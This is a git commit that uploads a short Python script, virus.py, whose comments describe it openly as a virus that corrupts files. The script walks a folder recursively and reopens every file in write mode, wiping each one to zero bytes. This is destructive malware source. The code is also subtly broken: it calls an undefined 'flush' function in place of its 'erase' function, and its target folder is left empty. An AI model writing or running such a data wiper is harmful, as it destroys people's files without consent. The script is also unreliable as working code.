7f4212a7720929eef5a95493466a142de23fd419
106_Sam <70407632+106-Sam@users.noreply.github.com>
2021-08-02 09:27:16 +0000

    Add files via upload

---
+++ virus.py
@@ -0,0 +1,25 @@
+#!/bin/python3
+
+import os
+
+#This virus is going to erase data from any file present in the directory or Folder#It Corrupts the file and make it into 0 bytes
+#erasing data of the file and the file gets corrputed
+
+def erase(file):
+    fp=open(file,"w")
+    fp.close()
+
+def cd(folder):
+    files = os.listdir(folder)
+    for item in files:
+        temp=folder+"/"+item
+        print(temp)
+        if(os.path.isfile(temp)):
+            flush(temp)
+        else:
+            cd(temp)
+
+#example: folder="/tmp"
+
+folder=""
+cd(folder)
